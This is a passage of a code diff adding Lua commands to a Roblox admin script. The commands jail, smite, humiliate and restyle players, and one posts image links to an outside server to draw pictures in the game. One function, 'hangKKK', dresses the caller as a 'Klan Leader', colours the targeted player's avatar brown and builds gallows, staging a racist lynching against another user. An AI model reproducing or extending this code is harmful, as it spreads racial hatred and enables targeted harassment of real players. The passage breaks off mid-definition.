+			p.Anchored = true
+			p.Size = Vector3.new(1, 1, 1)
+			p.TopSurface = 'Smooth'
+			p.BottomSurface = 'Smooth'
+			p.BrickColor = BrickColor.new('Crimson')
+			p.Transparency = .9
+			p.CFrame = cf * CFrame.Angles(math.rad(x * 10), math.rad(y * 10), 0) * CFrame.new(0, 0, -6)
+		end
+	end
+	coroutine.resume(coroutine.create(function()
+		while Jail and Jail.Parent == workspace do
+			if Player ~= nil then
+				pcall(function()
+					if (Player.Character.HumanoidRootPart.Position - cf.p).magnitude >= 6 then
+						Player.Character.HumanoidRootPart.CFrame = cf
+					end
+				end)
+			end
+			for i, v in pairs(game:service'Players':GetPlayers()) do
+				if v.Name == PlayerName then
+					Player = v
+				end
+			end
+			wait()
+		end
+	end))
+end
+function Root.anchorAll(Object)
+	if not Object.Parent:IsA'Tool' and not Object.Parent:IsA"Accoutrement" then
+		if Object:IsA("BasePart") then
+			Object.Anchored = true
+		end
+		for ID, Object in pairs(Object:GetChildren()) do
+			Root.anchorAll(Object)
+		end
+	end
+end
+function Root.AddLog(msg)
+table.insert(Root.ServerLogs, {
+			msg,
+			os.time(),
+			time()
+		})
+end
+function Root.PlayerChatted(Player, Message, DontLog)
+	if Message:sub(1, 21) == '/e !prefixoverride/!:' then
+		return Root.PlayerChatted(Player, Root.Prefix..Message:sub(22), DontLog)
+	end
+	if Root.Prefix~='' and Message:sub(1,5)=='!hat ' and #Message >= 6 then
+	Root.Commands['!hat'].Function(Player,Root.Split(Message:sub(6),' '))
+	end
+	if not DontLog then
+		Root.AddLog('['..Player.Name..']: '..Message)
+	end
+	if Message:sub(1, #Root.Prefix) == Root.Prefix then
+		local Func, Arguments, Rank = Root.ParseCommand(Message:sub(#Root.Prefix + 1))
+		if Func and Root.GetRank(Player) >= Rank then
+			local ecc = Func(Player, Arguments)
+			if ecc then
+				Root.Ping(Player, ecc)
+			end
+		elseif Root.GetRank(Player) < Rank and Func then
+		Root.Ping(Player,'You cannot use this command.\nYou require level '..Root.RankName(Rank)..' to use this command.','Really red')
+		end
+	end
+end
+function Root.Split(Message, Splitter)
+	local start = 1
+	local args = {}
+	for i = 1, #Message do
+		if Message:sub(i, i) == Splitter then
+			args[#args + 1] = Message:sub(start, i - 1)
+			start = i + 1
+		elseif i == #Message then
+			args[#args + 1] = Message:sub(start, i)
+		end
+	end
+	return args
+end
+function Root.Join(T)
+	local tr = ''
+	for i = 1, #T do
+		tr = tr..T[i]
+		if i ~= #T then
+			tr = tr..' '
+		end
+	end
+	return tr
+end
+function Root.NewServer(PlaceId)
+	local Http = game:service'HttpService'
+	--Http:GetAsync('http://roblox-proxy.cf/proxy/api/NewServer/'..tostring(PlaceId))
+end
+function Root.TraceIP(Address)
+	local Http = game:service'HttpService'
+	--local c = Http:GetAsync("http://ip-api.com/json/"..Http:UrlEncode({
+	--	Address
+	--}))
+	return Http:JSONDecode(c)
+end
+function Sound(id, toloop, xd)
+	local music = Instance.new('Sound')
+	if xd then music.Name = xd end
+	music.Parent = game.SoundService
+	music.Looped = toloop or false
+	music.Pitch = 1
+	music.SoundId = "http://www.roblox.com/asset/?id="..id
+	music:Play()
+	spawn(function()
+	repeat wait'' until music.Playing == false
+	 if music.Looped == false then music:Destroy() end
+	end)
+end
+function Root.Smite(Player)
+	local char = Player.Character
+	local tors = char.HumanoidRootPart
+	Sound(357559831, false, "thunderss")
+	wait(.3)
+	local cf = tors.CFrame * CFrame.Angles(math.rad(math.random(-45, 45)), 0, math.rad(math.random(-45, 45))) * CFrame.new(0, 100, 0)
+	tors.Anchored = true
+	for i = 1, 20 do
+		wait()
+		tors.Anchored = true
+		local v = Instance.new('Part', char)
+		v.Size = Vector3.new(0, 5, 0)
+		v.Transparency = .5
+		v.Reflectance = .75
+		v.Anchored = true
+		v.CanCollide = false
+		v.FormFactor = 'Custom'
+		v.CFrame = cf * CFrame.new(0.25, -(i * 5), 0.25)
+		game:service'Debris':AddItem(v, .03)
+	end
+	tors.Anchored = false
+	Instance.new('Explosion', char).Position = tors.Position
+	char:BreakJoints()
+end
+function Root.mlgParticle(Player)
+	local char = Player.Character
+	local tors = char.Torso
+	local emit = Instance.new("ParticleEmitter")
+	emit.Parent = tors
+	emit.Texture = "http://www.roblox.com/asset/?id=8979672"
+	emit.VelocitySpread = 20
+	emit = Instance.new("ParticleEmitter")
+	emit.Parent = tors
+	emit.Texture = "http://www.roblox.com/asset/?id=176067516"
+	emit.VelocitySpread = 20
+	emit = Instance.new("ParticleEmitter")
+	emit.Parent = tors
+	emit.Texture = "http://www.roblox.com/asset/?id=179012130"
+	emit.VelocitySpread = 20
+end
+function Root.harambeBecome(Player)
+	-- Version 2 The Legendary Divine Urban Rebirth Rewrite Harambe Become
+	local char = Player.Character
+	local tors = char.Torso
+	Root.mlgParticle(Player)
+
+	for i,v in pairs (char.Torso:GetChildren()) do
+	    if v.ClassName == 'Decal' then
+	         v:Destroy()
+	    end
+	end
+	for i,v in pairs (char:GetChildren()) do
+	    if v.ClassName == 'Hat' then
+	        v:Destroy()
+	    end
+	end
+	for i,v in pairs (char.Head:GetChildren()) do
+	    if v.ClassName == 'Decal' then
+	        v:Destroy()
+	    end
+	end
+
+	local harambe = Instance.new('SpecialMesh', tors)
+	harambe.MeshType = 'FileMesh'
+	harambe.MeshId = 'http://www.roblox.com/asset/?id=430330296'
+	harambe.TextureId = 'http://www.roblox.com/asset/?id=430330316'
+	harambe.Scale = Vector3.new(0.01, 0.01, 0.01)
+	char.Head.Transparency = 1
+	char['Left Arm'].Transparency = 1
+	char['Right Arm'].Transparency = 1
+	char['Left Leg'].Transparency = 1
+	char['Right Leg'].Transparency = 1
+end
+function Root.pee(Player)
+	local char = Player.Character 
+	local heed = char.Head 
+	local tors = char.Torso
+	local function Weld(x,y)
+	       local W = Instance.new("Weld")
+	       W.Part0 = x
+	       W.Part1 = y
+	       local CJ = CFrame.new(x.Position)
+	       local C0 = x.CFrame:inverse()*CJ
+	       local C1 = y.CFrame:inverse()*CJ
+	       W.C0 = C0
+	       W.C1 = C1
+	       W.Parent = x
+	end
+	local Breath=Instance.new("Part",heed)
+	Breath.CFrame=tors.CFrame*CFrame.new(0,-1,0)
+	Breath.CanCollide=false
+	Breath.Transparency=1
+	Breath.Size=Vector3.new(0.050,0.050,0.050)
+	local Air=Instance.new("ParticleEmitter")
+	Air.Parent=Breath
+	Air.EmissionDirection="Front"
+	Air.Rate=500
+	local Pees=Instance.new("Sound")
+	Pees.Parent=tors
+	Pees.SoundId="rbxassetid://258063615"
+	Pees.Looped=true
+	Pees.Volume=0.8
+	Pees:Play()
+	Air.Color=ColorSequence.new(Color3.new(255,255,0),Color3.new(255,255,0))
+	Air.Speed=NumberRange.new(15,15)
+	Air.Acceleration=Vector3.new(0,-25,0)
+	Air.Size=NumberSequence.new(0.1,0.1)
+	Air.Lifetime=NumberRange.new(0.5,0.5)
+	Air.Transparency=NumberSequence.new(0,0)
+	Weld(heed,Breath)
+	spawn(function()
+		while true do
+			local pee = Instance.new("Part", workspace)
+			game:GetService("Debris"):AddItem(pee, 10)
+			pee.CFrame=tors.CFrame*CFrame.new(0,-2.9,-6)
+			pee.CanCollide=false
+			pee.BrickColor=BrickColor.new("New Yeller")
+			pee.Transparency=0.4
+			local pmesh=Instance.new("SpecialMesh")
+			pmesh.Parent=pee
+			pmesh.Scale=Vector3.new(1,0.1,1)
+			pmesh.MeshType="Sphere"
+			pee.Anchored=true
+			pee.Size=Vector3.new(1.5,0.01,1.5)
+			wait(0.00000000001)
+			pee.Size=Vector3.new(1.6,0.01,1.6)
+			wait(0.00000000001)
+			pee.Size=Vector3.new(1.7,0.01,1.7)
+			wait(0.00000000001)
+			pee.Size=Vector3.new(1.9,0.01,1.9)
+			wait(0.00000000001)
+			pee.Size=Vector3.new(2,0.01,2)
+			wait (1/60)
+		end --made by credit
+	end)
+end
+function Root.fart(Player)
+	local s = Instance.new("Smoke")
+	s.Color = Color3.fromRGB(0,255,0)
+	s.RiseVelocity = -.5
+	s.Parent = Player.Character.Torso
+end
+function Root.clearImg()
+	if workspace:FindFirstChild("Images") then
+		for i,v in next, workspace.Images:GetChildren() do
+			v:Destroy()
+		end
+	end
+end
+function Root.draw(Player, Link)
+	local StartPos = Player.Character:FindFirstChild("HumanoidRootPart").CFrame
+	if Link then
+    	local function Draw(Pos,Color)
+        	local e = Instance.new('Part')
+            e.Position = Pos
+            e.Color = Color
+            e.Anchored = true
+            e.Shape = "Block"
+            e.Material = Enum.Material.SmoothPlastic
+            e.Transparency = .2
+            e.Size = Vector3.new(0.12,0.12,0.12)
+            if workspace:FindFirstChild("Images") then
+            	e.Parent = workspace.Images
+            else 
+            	local Images = Instance.new("Folder",workspace)
+                Images.Name = "Images"
+                e.Parent = Images
+           	end
+        end
+                
+        local content = game:GetService("HttpService"):RequestAsync(
+        	{
+            	Url = 'https://handlevrimage.glitch.me/',  
+                Method = 'POST',
+                Headers = {
+                	['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService'HttpService':JSONEncode({image = Link})
+        	}
+        )
+
+        local function hex2rgb(hex)
+        	hex = hex:gsub("#","")
+            local r = tonumber("0x"..hex:sub(1,2))
+            local g = tonumber("0x"..hex:sub(3,4))
+            local b = tonumber("0x"..hex:sub(5,6))
+            return Color3.fromRGB(r,g,b)
+        end
+
+        local ImageData = game:GetService("HttpService"):JSONDecode(content.Body) 
+        local H = 0
+        for _,_ in pairs(ImageData) do
+        	H = H + 1
+        end
+        for Y,Raw in pairs(ImageData) do
+        	for I = 0,#Raw-6,6 do
+            	local RGB = hex2rgb(string.sub(Raw,I+1,I+6))
+                local X = I/6
+                Draw((StartPos * CFrame.new(X/12,-Y/12 + (H/12) ,0)).p ,RGB)
+            end
+            wait(.05)
+        end
+        return true
+    end
+end
+function Root.hangKKK(Player, Victim)
+	--Made by OpTic Wisdom/LikeATrollFace
+
+	local KlanLeader = Player
+	KlanLeader.Character.Humanoid.DisplayName = "Klan Leader"
+
+	local kekkk = Instance.new("Sound", game.Workspace)
+	kekkk.Volume = 100
+	kekkk.SoundId = "rbxassetid://507332641"
+	kekkk.Name = "kekkk"
+	kekkk:Play()
+
+	if not KlanLeader.Character:FindFirstChild("Shirt Graphic") then
+		Instance.new("ShirtGraphic", KlanLeader.Character)
+	end
+
+
+	if KlanLeader.Character:FindFirstChild("Shirt") then KlanLeader.Character.Shirt:Destroy()
+	end
+	if KlanLeader.Character:FindFirstChild("Pants") then KlanLeader.Character.Pants:Destroy()
+	end
+
+	for _, v in pairs(KlanLeader.Character:GetChildren()) do
+	if v:IsA("Hat") then
+	v:Destroy()
+	end
+	end
+
+	for _, v in pairs(KlanLeader.Character:GetChildren()) do
+	if v:IsA("CharacterMesh") then
+	v:Destroy()
+	end
+	end
+
+	if Victim.Character:FindFirstChild("Pants") then Victim.Character.Pants:Destroy()
+	end
+	if Victim.Character:FindFirstChild("Shirt") then Victim.Character.Shirt:Destroy()
+	end
+
+	local x = game:GetService("InsertService"):LoadAsset(1082932)
+	for i,v in pairs(x:GetChildren()) do
+	v.Parent = Player.Character
+	end
+	wait(0.1)
+	x = game:GetService("InsertService"):LoadAsset(15727015)
+	for i,v in pairs(x:GetChildren()) do
+	v.Parent = Player.Character
+	end
+	wait(0.1)
+	KlanLeader.Character.TrafficCone.Handle.Mesh.MeshId = "http://www.roblox.com/asset/?id=1082802"
+	KlanLeader.Character.TrafficCone.Handle.Mesh.Scale = Vector3.new(1.08,1.7,1.08)
+	KlanLeader.Character["Gaga glasses"].Handle.Mesh.Scale = Vector3.new(0.5,0.6,0.6)
+	KlanLeader.Character.TrafficCone.Handle.Mesh.TextureId = "http://www.roblox.com/asset/?id=37911695"
+	KlanLeader.Character["Gaga glasses"].Handle.Mesh.TextureId = "http://www.roblox.com/asset/?id=15721268"
+	KlanLeader.Character.TrafficCone.AttachmentForward = Vector3.new(0,0,-1)
+	KlanLeader.Character.TrafficCone.AttachmentRight = Vector3.new(1,0,0)
+	KlanLeader.Character.TrafficCone.AttachmentUp = Vector3.new(0,1,0)
+	KlanLeader.Character["Shirt Graphic"].Graphic = "http://www.roblox.com/asset/?id=396340736"
+	KlanLeader.Character.Head.BrickColor = BrickColor.new(1)
+	KlanLeader.Character.Torso.BrickColor = BrickColor.new(1)
+	KlanLeader.Character["Left Arm"].BrickColor = BrickColor.new(1)
+	KlanLeader.Character["Right Arm"].BrickColor = BrickColor.new(1)
+	KlanLeader.Character["Left Leg"].BrickColor = BrickColor.new(1)
+	KlanLeader.Character["Right Leg"].BrickColor = BrickColor.new(1)
+
+	Victim.Character.Head.BrickColor = BrickColor.new("Dirt brown")
+	Victim.Character.Torso.BrickColor = BrickColor.new("Dirt brown")
+	Victim.Character["Left Arm"].BrickColor = BrickColor.new("Dirt brown")
+	Victim.Character["Right Arm"].BrickColor = BrickColor.new("Dirt brown")
+	Victim.Character["Left Leg"].BrickColor = BrickColor.new("Dirt brown")
+	Victim.Character["Right Leg"].BrickColor = BrickColor.new("Dirt brown")
+
+	local Create = function(itemClass,tabl)
+	local item = Instance.new(itemClass)
+	for i,v in pairs(tabl) do
+	local a,b = pcall(function() return item[i] end)
+	if a then
+	item[i] = tabl[i]
+	end
+	end
+	return item
+	end
+	local function runDummyScript(f,scri)
+	local oldenv = getfenv(f)
+	local newenv = setmetatable({}, {
+	__index = function(_, k)
+	if k:lower() == 'script' then
+	return scri
+	else
+	return oldenv[k]
+	end
+	end
+	})
+	setfenv(f, newenv)
+	pcall(function() f() end)
+	end
+	local cors = {}
+	local mas = Instance.new("Model",game:GetService("Lighting")) 
+	mas.Name = "CompiledModel"
+	local o1 = Create("Model",{
+	["Name"] = "Gallows",
+	["Parent"] = mas,
+	})
+	local o2 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-24, 0.600031018, 62),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-24, 0.600031018, 62, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+	["Size"] = Vector3.new(2, 1.20000005, 8),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o3 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-22, 1.20002401, 62),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-22, 1.20002401, 62, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+	["Size"] = Vector3.new(2, 2.4000001, 8),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o4 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-18, 2.40002704, 62),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-18, 2.40002704, 62, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+	["Size"] = Vector3.new(2, 4.80000019, 8),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o5 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-20, 1.80002904, 62),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-20, 1.80002904, 62, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+	["Size"] = Vector3.new(2, 3.60000014, 8),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o6 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-16, 3.00002789, 62),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-16, 3.00002789, 62, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+	["Size"] = Vector3.new(2, 6, 8),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o7 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-14.5, 2.40002704, 69.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-14.5, 2.40002704, 69.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 4.80000019, 1),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o8 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-5.5, 2.40002704, 69.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-5.5, 2.40002704, 69.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 4.80000019, 1),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o9 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-3.5, 5.40002203, 50.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-3.5, 5.40002203, 50.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 1.20000005, 1),
+	["LeftSurface"] = Enum.SurfaceType.Hinge,
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o10 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-10, 5.40002203, 47.5),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-10, 5.40002203, 47.5, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+	["Size"] = Vector3.new(10, 1.20000005, 45),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o11 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-1, 5.40002203, 60.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-1, 5.40002203, 60.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(19, 1.20000005, 8),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o12 = Create("Part",{
+	["Name"] = "trap",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-1, 5.40002203, 47),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-1, 5.40002203, 47, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(6, 1.20000005, 6),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o13 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-2.5, 7.20002079, 57.5),
+	["CFrame"] = CFrame.new(-2.5, 7.20002079, 57.5, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+	["Size"] = Vector3.new(1, 2.4000001, 3),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o14 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(3.5, 2.40002704, 69.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(3.5, 2.40002704, 69.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 4.80000019, 1),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o15 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(2.5, 5.40002203, 47),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(2.5, 5.40002203, 47, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+	["CanCollide"] = false,
+	["Size"] = Vector3.new(1, 1.20000005, 8),
+	["TopSurface"] = Enum.SurfaceType.Smooth,
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o16 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-3.5, 5.40002203, 43.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-3.5, 5.40002203, 43.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 1.20000005, 1),
+	["RightSurface"] = Enum.SurfaceType.Hinge,
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o17 = Create("Part",{
+	["Name"] = "welder",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Reddish brown"),
+	["Position"] = Vector3.new(-0.5, 6.60002804, 47),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["CFrame"] = CFrame.new(-0.5, 6.60002804, 47, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(4, 1.20000005, 3),
+	["BottomSurface"] = Enum.SurfaceType.Weld,
+	["Color"] = Color3.new(0.411765, 0.25098, 0.156863),
+	})
+	local o18 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(0, 7.20002079, 56.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["CFrame"] = CFrame.new(0, 7.20002079, 56.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 2.4000001, 4),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o19 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(3.5, 5.40002203, 47.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(3.5, 5.40002203, 47.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(45, 1.20000005, 1),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o20 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(0, 7.20002079, 58.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["CFrame"] = CFrame.new(0, 7.20002079, 58.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 2.4000001, 4),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o21 = Create("Part",{
+	["Name"] = "gallowswitch",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-1.63906896, 8.80330181, 57.5),
+	["Rotation"] = Vector3.new(-90, 60.0933647, -90),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-1.63906896, 8.80330181, 57.5, 1.78087221e-017, 0.498588145, 0.866838992, 4.72897554e-019, -0.866839051, 0.498588145, 1.00000012, -8.46929136e-018, -1.56730758e-017),
+	["Size"] = Vector3.new(1, 4.80000019, 1),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o22 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-0.5, 10.800024, 51.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-0.5, 10.800024, 51.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 9.60000038, 1),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o23 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-0.5, 10.800024, 42.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-0.5, 10.800024, 42.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 9.60000038, 1),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o24 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(2.5, 7.20002079, 57.5),
+	["CFrame"] = CFrame.new(2.5, 7.20002079, 57.5, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+	["Size"] = Vector3.new(1, 2.4000001, 3),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o25 = Create("Part",{
+	["Name"] = "gallowswitch2",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Transparency"] = 1,
+	["Position"] = Vector3.new(1.5, 9.00002384, 57.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(1.5, 9.00002384, 57.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 6, 1),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o26 = Create("Part",{
+	["Name"] = "rope",
+	["Parent"] = o1,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-0.5, 12.6000204, 46.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["RotVelocity"] = Vector3.new(9.29485318e-017, 7.26643592e-018, 9.29485318e-017),
+	["Velocity"] = Vector3.new(6.78266e-017, -0.644254982, 6.78266e-017),
+	["CFrame"] = CFrame.new(-0.5, 12.6000204, 46.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 1.20000005, 1),
+	["BottomSurface"] = Enum.SurfaceType.Motor,
+	["TopSurface"] = Enum.SurfaceType.Motor,
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o27 = Create("SpecialMesh",{
+	["Parent"] = o26,
+	["MeshType"] = Enum.MeshType.Sphere,
+	})
+	local o28 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-1, 5.40002203, 34),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-1, 5.40002203, 34, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(18, 1.20000005, 8),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o29 = Create("Part",{
+	["Name"] = "rope",
+	["Parent"] = o1,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-0.5, 13.8000278, 46.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["RotVelocity"] = Vector3.new(9.29485318e-017, 5.65548431e-018, 9.29485318e-017),
+	["Velocity"] = Vector3.new(6.78266e-017, -0.42925173, 6.78266e-017),
+	["CFrame"] = CFrame.new(-0.5, 13.8000278, 46.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 1.20000005, 1),
+	["BottomSurface"] = Enum.SurfaceType.Motor,
+	["TopSurface"] = Enum.SurfaceType.Motor,
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o30 = Create("SpecialMesh",{
+	["Parent"] = o29,
+	["MeshType"] = Enum.MeshType.Sphere,
+	})
+	local o31 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
